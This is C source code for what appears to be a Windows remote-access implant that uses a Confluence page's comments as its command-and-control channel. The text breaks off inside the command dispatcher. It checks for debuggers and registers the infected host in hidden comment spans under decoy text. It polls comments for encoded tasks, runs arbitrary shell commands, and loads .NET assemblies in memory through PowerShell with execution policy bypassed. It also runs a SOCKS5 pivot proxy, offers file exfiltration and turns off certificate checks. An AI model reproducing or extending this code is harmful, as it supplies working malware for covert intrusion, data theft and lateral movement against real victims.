/* Author: Dhanush Arvind */

#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0600
#endif

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <stdint.h>

#pragma comment(lib, "winhttp.lib")

#define CFG_CONFLUENCE_HOST  "__CONFLUENCE_HOST__"
#define CFG_CONFLUENCE_PORT  __CONFLUENCE_PORT__
#define CFG_PAGE_ID          "__PAGE_ID__"
#define CFG_AUTH_B64         "__AUTH_B64__"
#define CFG_SLEEP_MS         __SLEEP_MS__
#define CFG_USE_WIKI_PREFIX  __USE_WIKI_PREFIX__

static int check_debugger(void) {
    if (IsDebuggerPresent()) return 1;
    BOOL remote = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &remote);
    return remote ? 1 : 0;
}

static const char B64T[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static void b64_encode(const unsigned char *in, size_t len, char *out) {
    size_t i, j = 0;
    for (i = 0; i + 2 < len; i += 3) {
        out[j++] = B64T[(in[i] >> 2) & 0x3F];
        out[j++] = B64T[((in[i] & 0x3) << 4) | ((in[i+1] >> 4) & 0xF)];
        out[j++] = B64T[((in[i+1] & 0xF) << 2) | ((in[i+2] >> 6) & 0x3)];
        out[j++] = B64T[in[i+2] & 0x3F];
    }
    if (i < len) {
        out[j++] = B64T[(in[i] >> 2) & 0x3F];
        if (i + 1 < len) {
            out[j++] = B64T[((in[i] & 0x3) << 4) | ((in[i+1] >> 4) & 0xF)];
            out[j++] = B64T[((in[i+1] & 0xF) << 2)];
        } else {
            out[j++] = B64T[((in[i] & 0x3) << 4)];
            out[j++] = '=';
        }
        out[j++] = '=';
    }
    out[j] = '\0';
}

static int b64_decode(const char *in, unsigned char *out, size_t out_max) {
    unsigned char dt[256];
    int k;
    memset(dt, 0xFF, sizeof(dt));
    for (k = 0; k < 26; k++) { dt['A'+k]=(unsigned char)k; dt['a'+k]=(unsigned char)(26+k); }
    for (k = 0; k < 10; k++) dt['0'+k]=(unsigned char)(52+k);
    dt['+']=62; dt['/']=63;
    size_t i = 0, j = 0;
    unsigned int acc = 0;
    int bits = 0;
    while (in[i] && j < out_max) {
        unsigned char v;
        if (in[i]=='='||in[i]=='\n'||in[i]=='\r'||in[i]==' ') { i++; continue; }
        v = dt[(unsigned char)in[i]];
        if (v == 0xFF) { i++; continue; }
        acc = (acc << 6) | v;
        bits += 6;
        if (bits >= 8) { bits -= 8; out[j++] = (unsigned char)((acc >> bits) & 0xFF); }
        i++;
    }
    return (int)j;
}

static void to_wide(const char *narrow, wchar_t *wide, int wide_max) {
    MultiByteToWideChar(CP_UTF8, 0, narrow, -1, wide, wide_max);
}

static void escape_json(const char *src, char *dst, size_t dst_max) {
    size_t j = 0;
    for (size_t i = 0; src[i] && j < dst_max - 2; i++) {
        switch (src[i]) {
            case '"':  dst[j++]='\\'; dst[j++]='"';  break;
            case '\\': dst[j++]='\\'; dst[j++]='\\'; break;
            case '\n': dst[j++]='\\'; dst[j++]='n';  break;
            case '\r': dst[j++]='\\'; dst[j++]='r';  break;
            case '\t': dst[j++]='\\'; dst[j++]='t';  break;
            default:   dst[j++]=src[i]; break;
        }
    }
    dst[j] = '\0';
}

static void html_encode(const char *src, char *dst, size_t dst_max) {
    size_t j = 0;
    for (size_t i = 0; src[i] && j + 6 < dst_max; i++) {
        switch (src[i]) {
            case '<':  memcpy(dst+j, "&lt;", 4);   j += 4; break;
            case '>':  memcpy(dst+j, "&gt;", 4);   j += 4; break;
            case '&':  memcpy(dst+j, "&amp;", 5);  j += 5; break;
            case '"':  memcpy(dst+j, "&quot;", 6); j += 6; break;
            case '\r': break;
            default:   dst[j++] = src[i]; break;
        }
    }
    dst[j] = '\0';
}

static void decode_html_entities(char *str) {
    char *r = str, *w = str;
    while (*r) {
        if (*r == '&') {
            if (strncmp(r, "&amp;", 5) == 0)      { *w++ = '&';  r += 5; }
            else if (strncmp(r, "&lt;", 4) == 0)   { *w++ = '<';  r += 4; }
            else if (strncmp(r, "&gt;", 4) == 0)   { *w++ = '>';  r += 4; }
            else if (strncmp(r, "&quot;", 6) == 0)  { *w++ = '"';  r += 6; }
            else if (strncmp(r, "&nbsp;", 6) == 0)  { *w++ = ' ';  r += 6; }
            else *w++ = *r++;
        } else {
            *w++ = *r++;
        }
    }
    *w = '\0';
}

static void run_shell(const char *cmd, char *out, size_t out_max) {
    FILE *fp = _popen(cmd, "r");
    if (fp) {
        size_t off = 0;
        while (off < out_max - 1 && fgets(out + off, (int)(out_max - off), fp))
            off = strlen(out);
        _pclose(fp);
    } else {
        strcpy(out, "[!] popen failed");
    }
}

static uint32_t simple_hash(const char *s) {
    uint32_t h = 0x811c9dc5;
    while (*s) {
        h ^= (uint8_t)*s++;
        h *= 0x01000193;
    }
    return h;
}

static char g_agent_id[16];

static void generate_agent_id(void) {
    char hostname[256] = {0}, username[256] = {0}, combined[512];
    DWORD hl = sizeof(hostname), ul = sizeof(username);
    GetComputerNameA(hostname, &hl);
    GetUserNameA(username, &ul);
    DWORD pid = GetCurrentProcessId();
    _snprintf(combined, sizeof(combined), "%s\\%s\\%lu", hostname, username,
              (unsigned long)pid);
    uint32_t h = simple_hash(combined);
    _snprintf(g_agent_id, sizeof(g_agent_id), "%08x", h);
}

static HINTERNET g_hSession = NULL;

static void winhttp_init(void) {
    wchar_t ua[256];
    to_wide("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", ua, 256);
    g_hSession = WinHttpOpen(ua, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                             WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
}

static void winhttp_ignore_certs(HINTERNET hReq) {
    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                  SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                  SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
    WinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));
}

static int winhttp_request(const wchar_t *verb, const wchar_t *path,
                           const char *body, size_t body_len,
                           char *resp_buf, size_t resp_max) {
    wchar_t host_w[256];
    to_wide(CFG_CONFLUENCE_HOST, host_w, 256);

    HINTERNET hConn = WinHttpConnect(g_hSession, host_w,
                                      (INTERNET_PORT)CFG_CONFLUENCE_PORT, 0);
    if (!hConn) return -1;

    HINTERNET hReq = WinHttpOpenRequest(hConn, verb, path, NULL,
                                         WINHTTP_NO_REFERER,
                                         WINHTTP_DEFAULT_ACCEPT_TYPES,
                                         WINHTTP_FLAG_SECURE);
    if (!hReq) { WinHttpCloseHandle(hConn); return -1; }

    winhttp_ignore_certs(hReq);

    char auth_hdr[512];
    _snprintf(auth_hdr, sizeof(auth_hdr), "Authorization: Basic %s", CFG_AUTH_B64);
    wchar_t auth_w[512];
    to_wide(auth_hdr, auth_w, 512);
    WinHttpAddRequestHeaders(hReq, auth_w, (DWORD)-1,
                             WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);

    if (body && body_len > 0) {
        WinHttpAddRequestHeaders(hReq,
            L"Content-Type: application/json",
            (DWORD)-1,
            WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
    }

    BOOL ok = WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                  (LPVOID)body, (DWORD)body_len,
                                  (DWORD)body_len, 0);
    if (!ok) {
        winhttp_ignore_certs(hReq);
        ok = WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                 (LPVOID)body, (DWORD)body_len,
                                 (DWORD)body_len, 0);
    }
    if (!ok) { WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConn); return -1; }
    if (!WinHttpReceiveResponse(hReq, NULL)) {
        WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConn); return -1;
    }

    DWORD total = 0;
    if (resp_buf && resp_max > 0) {
        while (total < (DWORD)(resp_max - 1)) {
            DWORD avail = 0;
            if (!WinHttpQueryDataAvailable(hReq, &avail) || avail == 0) break;
            if (avail > (DWORD)(resp_max - 1 - total))
                avail = (DWORD)(resp_max - 1 - total);
            DWORD rd = 0;
            if (!WinHttpReadData(hReq, resp_buf + total, avail, &rd) || rd == 0) break;
            total += rd;
        }
        resp_buf[total] = '\0';
    }

    DWORD status = 0, sz = sizeof(status);
    WinHttpQueryHeaders(hReq, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                        NULL, &status, &sz, NULL);

    WinHttpCloseHandle(hReq);
    WinHttpCloseHandle(hConn);
    return (int)status;
}

static void build_get_page_path(wchar_t *out, int out_max) {
    char path[512];
    if (CFG_USE_WIKI_PREFIX)
        _snprintf(path, sizeof(path),
                  "/wiki/rest/api/content/%s?expand=body.storage", CFG_PAGE_ID);
    else
        _snprintf(path, sizeof(path),
                  "/rest/api/content/%s?expand=body.storage", CFG_PAGE_ID);
    to_wide(path, out, out_max);
}

static void build_post_comment_path(wchar_t *out, int out_max) {
    char path[512];
    if (CFG_USE_WIKI_PREFIX)
        _snprintf(path, sizeof(path), "/wiki/rest/api/content");
    else
        _snprintf(path, sizeof(path), "/rest/api/content");
    to_wide(path, out, out_max);
}

static void build_get_comments_path(wchar_t *out, int out_max) {
    char path[512];
    if (CFG_USE_WIKI_PREFIX)
        _snprintf(path, sizeof(path),
                  "/wiki/rest/api/content/%s/child/comment"
                  "?expand=body.storage&limit=25", CFG_PAGE_ID);
    else
        _snprintf(path, sizeof(path),
                  "/rest/api/content/%s/child/comment"
                  "?expand=body.storage&limit=25", CFG_PAGE_ID);
    to_wide(path, out, out_max);
}

static int post_comment(const char *html_body) {
    char escaped[32768];
    escape_json(html_body, escaped, sizeof(escaped));

    char json[65536];
    _snprintf(json, sizeof(json),
        "{\"type\":\"comment\","
         "\"container\":{\"id\":\"%s\",\"type\":\"page\"},"
         "\"body\":{\"storage\":{\"value\":\"%s\","
                                "\"representation\":\"storage\"}}}",
        CFG_PAGE_ID, escaped);

    wchar_t path[512];
    build_post_comment_path(path, 512);
    return winhttp_request(L"POST", path, json, strlen(json), NULL, 0);
}

static char *get_page_body(void) {
    static char resp[262144];
    wchar_t path[512];
    build_get_page_path(path, 512);
    int status = winhttp_request(L"GET", path, NULL, 0, resp, sizeof(resp));
    if (status < 200 || status >= 300) return NULL;
    return resp;
}

static char *get_comments_json(void) {
    static char cresp[262144];
    wchar_t path[512];
    build_get_comments_path(path, 512);
    int status = winhttp_request(L"GET", path, NULL, 0, cresp, sizeof(cresp));
    if (status < 200 || status >= 300) return NULL;
    return cresp;
}

#define MAX_SEEN 256
static long g_seen_cids[MAX_SEEN];
static int  g_seen_count = 0;

static int cid_is_seen(long cid) {
    int i;
    for (i = 0; i < g_seen_count; i++)
        if (g_seen_cids[i] == cid) return 1;
    return 0;
}

static void cid_mark_seen(long cid) {
    if (cid_is_seen(cid)) return;
    if (g_seen_count < MAX_SEEN)
        g_seen_cids[g_seen_count++] = cid;
}

static long extract_comment_id_backward(const char *type_pos, const char *json_start) {
    const char *s = type_pos;
    int i;
    for (i = 0; i < 200 && s > json_start; i++, s--) {
        if (strncmp(s, "\"id\":\"", 6) == 0) {
            const char *id_s = s + 6;
            const char *id_e = strchr(id_s, '"');
            if (id_e) {
                char buf[32] = {0};
                size_t len = (size_t)(id_e - id_s);
                if (len < sizeof(buf)) {
                    memcpy(buf, id_s, len);
                    return atol(buf);
                }
            }
            break;
        }
    }
    return 0;
}

static void snapshot_initial_comments(void) {
    char *json = get_comments_json();
    if (!json) return;
    const char *p = strstr(json, "\"results\"");
    if (!p) return;
    while ((p = strstr(p, "\"type\":\"comment\"")) != NULL) {
        long cid = extract_comment_id_backward(p, json);
        if (cid > 0) cid_mark_seen(cid);
        p += 16;
    }
}

typedef struct {
    char task_id[64];
    char command[262144];
} PARSED_TASK;

#define MAX_SEEN_TIDS 256
static char g_seen_tids[MAX_SEEN_TIDS][64];
static int  g_seen_tid_count = 0;

static int tid_is_seen(const char *tid) {
    int i;
    for (i = 0; i < g_seen_tid_count; i++)
        if (strcmp(g_seen_tids[i], tid) == 0) return 1;
    return 0;
}

static void tid_mark_seen(const char *tid) {
    if (tid_is_seen(tid)) return;
    if (g_seen_tid_count < MAX_SEEN_TIDS) {
        strncpy(g_seen_tids[g_seen_tid_count], tid, 63);
        g_seen_tids[g_seen_tid_count][63] = '\0';
        g_seen_tid_count++;
    }
}

static int parse_task_from_html(const char *html, PARSED_TASK *task) {
    const char *marker = ">C2:TASK:";
    const char *p = html;
    const char *best = NULL;

    while ((p = strstr(p, marker)) != NULL) {
        const char *start = p + strlen(marker);
        const char *end_span = strstr(start, "</span>");
        if (!end_span) { p = start; continue; }

        const char *colon1 = memchr(start, ':', (size_t)(end_span - start));
        if (!colon1) { p = start; continue; }

        char tid[64] = {0};
        size_t tid_len = (size_t)(colon1 - start);
        if (tid_len >= sizeof(tid)) tid_len = sizeof(tid) - 1;
        memcpy(tid, start, tid_len);
        tid[tid_len] = '\0';

        if (tid_is_seen(tid)) {
            p = start;
            continue;
        }

        const char *after_tid_field = colon1 + 1;
        const char *colon2 = memchr(after_tid_field, ':', (size_t)(end_span - after_tid_field));

        const char *cmd_b64_start;
        if (colon2) {
            char target_agent[64] = {0};
            size_t ta_len = (size_t)(colon2 - after_tid_field);
            if (ta_len >= sizeof(target_agent)) ta_len = sizeof(target_agent) - 1;
            memcpy(target_agent, after_tid_field, ta_len);
            target_agent[ta_len] = '\0';

            if (strcmp(target_agent, "*") != 0 && strcmp(target_agent, g_agent_id) != 0) {
                p = start;
                continue;
            }
            cmd_b64_start = colon2 + 1;
        } else {
            cmd_b64_start = after_tid_field;
        }

        size_t cmd_b64_len = (size_t)(end_span - cmd_b64_start);
        static char cmd_b64[524288];
        memset(cmd_b64, 0, sizeof(cmd_b64));
        if (cmd_b64_len >= sizeof(cmd_b64)) cmd_b64_len = sizeof(cmd_b64) - 1;
        memcpy(cmd_b64, cmd_b64_start, cmd_b64_len);
        cmd_b64[cmd_b64_len] = '\0';

        static unsigned char decoded[262144];
        int dec_len = b64_decode(cmd_b64, decoded, sizeof(decoded) - 1);
        if (dec_len <= 0) { p = start; continue; }
        decoded[dec_len] = '\0';

        strcpy(task->task_id, tid);
        memcpy(task->command, decoded, dec_len + 1);
        best = start;
        break;
    }
    return best ? 1 : 0;
}

static int parse_cmd_from_comments(PARSED_TASK *task) {
    char *json = get_comments_json();
    if (!json) return 0;

    const char *p = strstr(json, "\"results\"");
    if (!p) return 0;

    while (1) {
        const char *type_pos = strstr(p, "\"type\":\"comment\"");
        if (!type_pos) break;

        long cid_num = extract_comment_id_backward(type_pos, json);
        if (cid_num <= 0) { p = type_pos + 16; continue; }

        if (cid_is_seen(cid_num)) { p = type_pos + 16; continue; }

        const char *val_marker = strstr(type_pos, "\"value\":\"");
        if (!val_marker) break;
        const char *val_start = val_marker + 9;
        const char *val_end = val_start;
        while (*val_end) {
            if (*val_end == '\\') { val_end += 2; continue; }
            if (*val_end == '"') break;
            val_end++;
        }
        if (!*val_end) break;

        {
            const char *out_m = strstr(val_start, "C2:OUT:");
            const char *reg_m = strstr(val_start, "C2:REG:");
            if ((out_m && out_m < val_end) || (reg_m && reg_m < val_end)) {
                cid_mark_seen(cid_num);
                p = val_end + 1;
                continue;
            }
        }

        const char *cmd_pos = NULL;
        char target_agent[64] = {0};
        {
            const char *sc;
            for (sc = val_start; sc + 5 <= val_end; sc++) {
                if (memcmp(sc, "[cmd:", 5) == 0) {
                    const char *bracket_end = memchr(sc + 5, ']', (size_t)(val_end - sc - 5));
                    if (bracket_end) {
                        size_t ta_len = (size_t)(bracket_end - (sc + 5));
                        if (ta_len > 0 && ta_len < sizeof(target_agent)) {
                            memcpy(target_agent, sc + 5, ta_len);
                            target_agent[ta_len] = '\0';
                        }
                        cmd_pos = bracket_end + 1;
                    }
                    break;
                }
                if (memcmp(sc, "[cmd]", 5) == 0) {
                    cmd_pos = sc + 5;
                    break;
                }
            }
        }
        if (!cmd_pos) { cid_mark_seen(cid_num); p = val_end + 1; continue; }

        if (target_agent[0] && strcmp(target_agent, g_agent_id) != 0) {
            cid_mark_seen(cid_num);
            p = val_end + 1;
            continue;
        }

        while (cmd_pos < val_end && *cmd_pos == ' ') cmd_pos++;
        {
            const char *cmd_end = cmd_pos;
            while (cmd_end < val_end && *cmd_end != '<') {
                if (*cmd_end == '\\' && cmd_end[1] == 'n') break;
                cmd_end++;
            }

            char raw_cmd[4096] = {0};
            size_t cmd_len = (size_t)(cmd_end - cmd_pos);
            if (cmd_len >= sizeof(raw_cmd)) cmd_len = sizeof(raw_cmd) - 1;
            memcpy(raw_cmd, cmd_pos, cmd_len);
            decode_html_entities(raw_cmd);

            char *t = raw_cmd;
            while (*t == ' ' || *t == '\t') t++;
            size_t tlen = strlen(t);
            while (tlen > 0 && (t[tlen-1]==' ' || t[tlen-1]=='\t' ||
                   t[tlen-1]=='\r' || t[tlen-1]=='\n'))
                t[--tlen] = '\0';

            if (tlen == 0) { cid_mark_seen(cid_num); p = val_end + 1; continue; }

            _snprintf(task->task_id, sizeof(task->task_id), "c%ld", cid_num);
            strncpy(task->command, t, sizeof(task->command) - 1);
            cid_mark_seen(cid_num);
            return 1;
        }
    }
    return 0;
}

static void register_agent(void) {
    char hostname[256] = {0}, username[256] = {0};
    DWORD hl = sizeof(hostname), ul = sizeof(username);
    GetComputerNameA(hostname, &hl);
    GetUserNameA(username, &ul);

    SYSTEM_INFO si;
    GetNativeSystemInfo(&si);
    const char *arch = "x64";
    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL) arch = "x86";
    else if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM64) arch = "arm64";

    char info_json[1024];
    _snprintf(info_json, sizeof(info_json),
        "{\"agent\":\"%s\",\"hostname\":\"%s\",\"username\":\"%s\","
         "\"pid\":%lu,\"os\":\"Windows\",\"arch\":\"%s\"}",
        g_agent_id, hostname, username,
        (unsigned long)GetCurrentProcessId(), arch);

    char info_b64[2048];
    b64_encode((unsigned char *)info_json, strlen(info_json), info_b64);

    char html[4096];
    _snprintf(html, sizeof(html),
        "<p><span style=\"display:none\">C2:REG:%s:%s</span></p><p>System check completed.</p>",
        g_agent_id, info_b64);

    post_comment(html);
}

static void send_output(const char *task_id, const char *output) {
    char out_b64[65536];
    b64_encode((unsigned char *)output, strlen(output), out_b64);

    SYSTEMTIME st;
    GetLocalTime(&st);
    char timestamp[64];
    _snprintf(timestamp, sizeof(timestamp), "%04d-%02d-%02d %02d:%02d:%02d",
              st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);

    char html[131072];
    _snprintf(html, sizeof(html),
        "<p><span style=\"display:none\">C2:OUT:%s:%s:%s</span></p><p>Updated: %s</p>",
        task_id, g_agent_id, out_b64, timestamp);

    post_comment(html);
}

static void send_visible_output(const char *task_id, const char *cmd_echo,
                                 const char *output) {
    static char vb64[65536];
    static char vhtml_out[131072];
    static char vhtml_cmd[512];
    static char vhtml[262144];

    b64_encode((unsigned char *)output, strlen(output), vb64);
    html_encode(output, vhtml_out, sizeof(vhtml_out));
    html_encode(cmd_echo, vhtml_cmd, sizeof(vhtml_cmd));

    _snprintf(vhtml, sizeof(vhtml),
        "<p><span style=\"display:none\">C2:OUT:%s:%s:%s</span></p>"
        "<p><strong>[%s] &gt; %s</strong></p>"
        "<pre>%s</pre>",
        task_id, g_agent_id, vb64,
        g_agent_id, vhtml_cmd, vhtml_out);

    post_comment(vhtml);
}

static void execute_dotnet_assembly(const char *payload, char *output, size_t output_max) {
    static char asm_b64[262144];
    char args[4096] = {0};

    const char *space = strchr(payload, ' ');
    if (space) {
        size_t b64_len = (size_t)(space - payload);
        if (b64_len >= sizeof(asm_b64)) b64_len = sizeof(asm_b64) - 1;
        memcpy(asm_b64, payload, b64_len);
        asm_b64[b64_len] = '\0';
        strncpy(args, space + 1, sizeof(args) - 1);
    } else {
        strncpy(asm_b64, payload, sizeof(asm_b64) - 1);
    }

    char temp_dir[MAX_PATH], temp_ps[MAX_PATH];
    GetTempPathA(sizeof(temp_dir), temp_dir);
    _snprintf(temp_ps, sizeof(temp_ps), "%s_ea_%08lx.ps1",
              temp_dir, (unsigned long)GetTickCount());

    FILE *f = fopen(temp_ps, "w");
    if (!f) {
        _snprintf(output, output_max, "[!] Failed to create loader script");
        return;
    }

    fprintf(f, "$ErrorActionPreference='Stop'\n");
    fprintf(f, "try {\n");
    fprintf(f, "  $b=[Convert]::FromBase64String('%s')\n", asm_b64);
    fprintf(f, "  $a=[Reflection.Assembly]::Load($b)\n");
    fprintf(f, "  $ep=$a.EntryPoint\n");
    fprintf(f, "  if($ep -eq $null){throw 'No entry point found'}\n");
    fprintf(f, "  $params=$ep.GetParameters()\n");
    if (args[0]) {
        fprintf(f, "  if($params.Count -gt 0){\n");
        fprintf(f, "    $ep.Invoke($null,@(,('%s' -split '\\s+')))\n", args);
        fprintf(f, "  } else {\n");
        fprintf(f, "    $ep.Invoke($null,$null)\n");
        fprintf(f, "  }\n");
    } else {
        fprintf(f, "  if($params.Count -gt 0){\n");
        fprintf(f, "    $ep.Invoke($null,@(,@()))\n");
        fprintf(f, "  } else {\n");
        fprintf(f, "    $ep.Invoke($null,$null)\n");
        fprintf(f, "  }\n");
    }
    fprintf(f, "} catch {\n");
    fprintf(f, "  \"[!] $($_.Exception.GetType().Name): $($_.Exception.Message)\"\n");
    fprintf(f, "  if($_.Exception.InnerException){\n");
    fprintf(f, "    \"[!] Inner: $($_.Exception.InnerException.Message)\"\n");
    fprintf(f, "  }\n");
    fprintf(f, "}\n");
    fclose(f);

    char ps_cmd[MAX_PATH * 2];
    _snprintf(ps_cmd, sizeof(ps_cmd),
              "powershell.exe -nop -ep bypass -f \"%s\"", temp_ps);
    run_shell(ps_cmd, output, output_max);

    DeleteFileA(temp_ps);
}

static volatile int g_socks_running = 0;
static HANDLE g_socks_thread = NULL;
static int g_socks_port = 0;
static volatile long g_socks_conns = 0;

static DWORD WINAPI socks_relay_thread(LPVOID param) {
    SOCKET client = (SOCKET)(ULONG_PTR)param;
    unsigned char buf[4];
    int n;

    n = recv(client, (char *)buf, 2, 0);
    if (n < 2 || buf[0] != 0x05) goto done;

    int nmethods = buf[1];
    unsigned char methods[256];
    if (nmethods > 0) recv(client, (char *)methods, nmethods, 0);

    buf[0] = 0x05; buf[1] = 0x00;
    send(client, (char *)buf, 2, 0);

    unsigned char req[512];
    n = recv(client, (char *)req, 4, 0);
    if (n < 4 || req[0] != 0x05 || req[1] != 0x01) goto done;

    char target_host[256] = {0};
    unsigned short target_port = 0;

    if (req[3] == 0x01) {
        unsigned char ip4[4];
        recv(client, (char *)ip4, 4, 0);
        _snprintf(target_host, sizeof(target_host), "%d.%d.%d.%d",
                  ip4[0], ip4[1], ip4[2], ip4[3]);
    } else if (req[3] == 0x03) {
        unsigned char dlen;
        recv(client, (char *)&dlen, 1, 0);
        recv(client, target_host, dlen, 0);
        target_host[dlen] = '\0';
    } else if (req[3] == 0x04) {
        unsigned char ip6[16];
        recv(client, (char *)ip6, 16, 0);
        strcpy(target_host, "::1");
    } else goto done;

    unsigned char port_bytes[2];
    recv(client, (char *)port_bytes, 2, 0);
    target_port = (port_bytes[0] << 8) | port_bytes[1];

    struct addrinfo hints, *res = NULL;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    char port_str[8];
    _snprintf(port_str, sizeof(port_str), "%u", target_port);

    if (getaddrinfo(target_host, port_str, &hints, &res) != 0 || !res) {
        unsigned char fail[] = {0x05, 0x04, 0x00, 0x01, 0,0,0,0, 0,0};
        send(client, (char *)fail, 10, 0);
        goto done;
    }

    SOCKET remote = socket(res->ai_family, SOCK_STREAM, 0);
    if (remote == INVALID_SOCKET) {
        freeaddrinfo(res);
        unsigned char fail[] = {0x05, 0x01, 0x00, 0x01, 0,0,0,0, 0,0};
        send(client, (char *)fail, 10, 0);
        goto done;
    }

    if (connect(remote, res->ai_addr, (int)res->ai_addrlen) != 0) {
        freeaddrinfo(res);
        closesocket(remote);
        unsigned char fail[] = {0x05, 0x05, 0x00, 0x01, 0,0,0,0, 0,0};
        send(client, (char *)fail, 10, 0);
        goto done;
    }
    freeaddrinfo(res);

    unsigned char reply[] = {0x05, 0x00, 0x00, 0x01, 0,0,0,0, 0,0};
    send(client, (char *)reply, 10, 0);

    InterlockedIncrement(&g_socks_conns);

    fd_set rfds;
    char relay_buf[8192];
    struct timeval tv;
    while (g_socks_running) {
        FD_ZERO(&rfds);
        FD_SET(client, &rfds);
        FD_SET(remote, &rfds);
        tv.tv_sec = 1; tv.tv_usec = 0;
        SOCKET maxfd = (client > remote ? client : remote) + 1;
        int sel = select((int)maxfd, &rfds, NULL, NULL, &tv);
        if (sel < 0) break;
        if (sel == 0) continue;
        if (FD_ISSET(client, &rfds)) {
            int r = recv(client, relay_buf, sizeof(relay_buf), 0);
            if (r <= 0) break;
            send(remote, relay_buf, r, 0);
        }
        if (FD_ISSET(remote, &rfds)) {
            int r = recv(remote, relay_buf, sizeof(relay_buf), 0);
            if (r <= 0) break;
            send(client, relay_buf, r, 0);
        }
    }

    InterlockedDecrement(&g_socks_conns);
    closesocket(remote);

done:
    closesocket(client);
    return 0;
}

static DWORD WINAPI socks_server_main(LPVOID param) {
    int port = (int)(ULONG_PTR)param;
    SOCKET listen_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (listen_sock == INVALID_SOCKET) { g_socks_running = 0; return 1; }

    int opt = 1;
    setsockopt(listen_sock, SOL_SOCKET, SO_REUSEADDR, (char *)&opt, sizeof(opt));

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    addr.sin_port = htons((unsigned short)port);

    if (bind(listen_sock, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
        closesocket(listen_sock);
        g_socks_running = 0;
        return 1;
    }
    if (listen(listen_sock, 8) != 0) {
        closesocket(listen_sock);
        g_socks_running = 0;
        return 1;
    }

    g_socks_port = port;

    while (g_socks_running) {
        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(listen_sock, &fds);
        struct timeval tv = {1, 0};
        if (select((int)(listen_sock + 1), &fds, NULL, NULL, &tv) <= 0)
            continue;
        SOCKET client = accept(listen_sock, NULL, NULL);
        if (client == INVALID_SOCKET) continue;
        HANDLE ht = CreateThread(NULL, 0, socks_relay_thread,
                                 (LPVOID)(ULONG_PTR)client, 0, NULL);
        if (ht) CloseHandle(ht);
        else closesocket(client);
    }

    closesocket(listen_sock);
    g_socks_port = 0;
    return 0;
}

static int execute_command(const char *cmd, char *raw_out, size_t out_size) {
    memset(raw_out, 0, out_size);

    if (strcmp(cmd, "whoami") == 0) {
        char hn[256]={0}, un[256]={0};
        DWORD h2=sizeof(hn), u2=sizeof(un);
        GetComputerNameA(hn, &h2);
        GetUserNameA(un, &u2);
        _snprintf(raw_out, out_size, "%s\\%s", hn, un);
    } else if (strcmp(cmd, "pwd") == 0) {
        GetCurrentDirectoryA((DWORD)out_size, raw_out);
    } else if (strncmp(cmd, "cd ", 3) == 0) {
        if (SetCurrentDirectoryA(cmd + 3))
            GetCurrentDirectoryA((DWORD)out_size, raw_out);
        else
            _snprintf(raw_out, out_size, "[!] cd failed: %lu", GetLastError());
    } else if (strcmp(cmd, "info") == 0) {
        char hn[256]={0}, un[256]={0};
        DWORD h2=sizeof(hn), u2=sizeof(un);
        GetComputerNameA(hn, &h2);
        GetUserNameA(un, &u2);
        _snprintf(raw_out, out_size,
            "Agent: %s\nHostname: %s\nUsername: %s\n"
            "PID: %lu\nOS: Windows\nTransport: Confluence",
            g_agent_id, hn, un, (unsigned long)GetCurrentProcessId());
    } else if (strcmp(cmd, "help") == 0) {
        _snprintf(raw_out, out_size,
            "Available commands:\n"
            "  whoami              - Print hostname\\username\n"
            "  pwd                 - Print current directory\n"
            "  cd <dir>            - Change directory\n"
            "  ls [dir]            - List directory contents\n"
            "  cat <file>          - Print file contents\n"
            "  ps                  - List running processes\n"
            "  ipconfig            - Show network configuration\n"
            "  netstat             - Show active connections\n"
            "  info                - Print agent metadata\n"
            "  download <file>     - Base64-encode and exfiltrate a file\n"
            "  shell <cmd>         - Execute command via cmd.exe\n"
            "  execute-assembly <b64> [args] - Load and run .NET assembly in memory\n"
            "  socks start <port>  - Start SOCKS5 proxy on 127.0.0.1:<port>\n"
            "  socks stop          - Stop SOCKS5 proxy\n"
            "  socks status        - Show SOCKS5 proxy status\n"
            "  help                - Show this help\n"
            "  exit                - Terminate the caller\n"
            "  <anything else>     - Executed as a shell command");
    } else if (strncmp(cmd, "sleep ", 6) == 0) {
        _snprintf(raw_out, out_size,
            "Sleep not adjustable at runtime in this build");
    } else if (strcmp(cmd, "exit") == 0) {
        strcpy(raw_out, "Agent exiting");
        return 1;
    } else if (strcmp(cmd, "ps") == 0) {
        run_shell("tasklist /FO TABLE", raw_out, out_size);
    } else if (strcmp(cmd, "ipconfig") == 0) {
        run_shell("ipconfig /all", raw_out, out_size);
    } else if (strcmp(cmd, "netstat") == 0) {
        run_shell("netstat -ano", raw_out, out_size);
    } else if (strncmp(cmd, "shell ", 6) == 0) {
        run_shell(cmd + 6, raw_out, out_size);
    } else if (strcmp(cmd, "ls") == 0 ||
